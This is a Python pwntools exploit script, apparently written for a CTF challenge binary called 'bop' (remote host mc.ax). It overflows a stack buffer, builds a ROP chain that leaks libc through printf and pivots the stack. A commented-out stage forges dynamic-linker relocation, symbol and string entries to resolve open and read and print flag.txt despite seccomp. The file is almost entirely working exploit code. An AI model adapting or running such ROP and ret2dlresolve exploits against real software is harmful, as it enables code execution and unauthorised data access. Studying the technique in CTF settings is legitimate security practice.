from pwn import *
import sys

elf = ELF("bop")
libc = ELF("libc-2.31.so")

io = process(elf.path)
# io = remote("mc.ax", 30284)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

gdb.attach(io, '''
    b *0x401365
''')

main_addr = 0x4012f9
ret = 0x40101a
pop_rdi_ret = 0x4013d3
pop_rsp_r13_r14_r15_ret = 0x04013cd
pop_rsi_r15_ret = 0x4013d1
plt_addr = 0x401020
relaplt_addr = 0x400680
relaplt_idx = (elf.bss() + 0x100 - relaplt_addr + 0x17) // 0x18
target_relaplt_addr = relaplt_addr + 0x18 * relaplt_idx
dynsym_addr = 0x4003d0
dynsym_idx = (elf.bss() + 0x160 - dynsym_addr + 0x17) // 0x18
target_dynsym_addr = dynsym_addr + 0x18 * dynsym_idx
dynstr_addr = 0x400520
target_dynstr_addr = elf.bss() + 0x1b0
dynstr_oft = target_dynstr_addr - dynstr_addr
flagtxt_addr = elf.bss() + 0x1c0
pivot_addr = elf.bss() + 0xe00
link_map_addr = pivot_addr + 0x200
link_map_ptr_addr = 0x404008

#############
# libc leak #
#############

io.recvuntil("? ")
p = b'A' * 0x28
p += p64(ret)
p += p64(pop_rdi_ret)
p += p64(elf.got["gets"])
p += p64(elf.sym["printf"])
p += p64(pop_rdi_ret)
p += p64(pivot_addr)
p += p64(elf.sym["gets"])
p += p64(pop_rsp_r13_r14_r15_ret)
p += p64(pivot_addr - 0x18)

io.sendline(p)
io.interactive()

# ###############
# # stack pivot #
# ###############

# p = b'A' * 0x28
# p += p64(elf.sym["seccomp_init"])
# p += p64(pop_rdi_ret)
# p += p64(target_relaplt_addr)
# p += p64(elf.sym["gets"])
# p += p64(pop_rdi_ret)
# p += p64(flagtxt_addr)
# p += p64(pop_rsi_r15_ret)
# p += p64(0x2) # O_RDONLY
# p += p64(0x0)
# p += p64(plt_addr) # open
# p += p64(relaplt_idx)
# p += p64(elf.sym["printf"])



# p += p64(pop_rdi_ret)
# p += p64(0x3) # fd
# p += p64(pop_rsi_r15_ret)
# p += p64(elf.bss() + 0xf80) # buf
# p += p64(0x0)
# p += p64(plt_addr) # read
# p += p64(relaplt_idx + 1)


# io.sendline(p)

# #############################
# # allocate dummy structures #
# #############################

# ## .rela.plt
# p = p64(elf.got["exit"])
# p += p64((dynsym_idx << 32) + 0x7) # r_info
# p += p64(0x0) # r_addend
# p += p64(elf.got["exit"])
# p += p64(((dynsym_idx+1) << 32) + 0x7) # r_info
# p += p64(0x0) # r_addend
# p += b'\x00' * (target_dynsym_addr - target_relaplt_addr - len(p))

# ## .dynsym
# p += p32(dynstr_oft) # st_name
# p += p8(0x12) # st_info
# p += p8(0x0) # st_other
# p += p16(0x0) # st_shndx
# p += p64(0x0) # st_value
# p += p64(0x0) # st_size
# p += p32(dynstr_oft + 5) # st_name
# p += p8(0x12) # st_info
# p += p8(0x0) # st_other
# p += p16(0x0) # st_shndx
# p += p64(0x0) # st_value
# p += p64(0x0) # st_size
# p += b'\x00' * (target_dynstr_addr - target_relaplt_addr - len(p))

# ## .dynstr
# p += b'open\x00read'
# p += b'\x00' * (flagtxt_addr - target_relaplt_addr - len(p))

# ## flag.txt
# p += b'flag.txt\x00'
# io.sendline(p)

# io.interactive()
